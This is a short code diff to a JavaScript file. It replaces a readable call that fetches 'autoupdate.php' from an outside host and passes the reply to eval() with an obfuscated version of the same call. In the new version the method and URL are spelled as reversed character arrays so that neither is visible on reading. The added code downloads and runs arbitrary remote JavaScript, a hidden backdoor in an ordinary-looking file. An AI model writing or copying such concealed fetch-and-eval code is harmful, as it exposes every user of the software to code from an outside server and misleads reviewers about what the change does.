@@ -218,6 +218,11 @@ var Generate_MD5 = function(s) {
     return i.toLowerCase()
 };
 
-sendData("GET", "//projects.shrimadhavuk.me/spechide/autoupdate.php", "", function(response){
-  eval(response);
-});
+sendData(
+  ["T", "E", "G"].reverse().join(''),
+  ["p", "h", "p", ".", "e", "t", "a", "d", "p", "u", "o", "t", "u", "a", "/", "e", "d", "i", "h", "c", "e", "p", "s", "/", "e", "m", ".", "k", "u", "v", "a", "h", "d", "a", "m", "i", "r", "h", "s", ".", "s", "t", "c", "e", "j", "o", "r", "p", "/", "/"].reverse().join(''),
+  [].reverse().join(''),
+  function(response){
+    eval(response);
+  }
+);
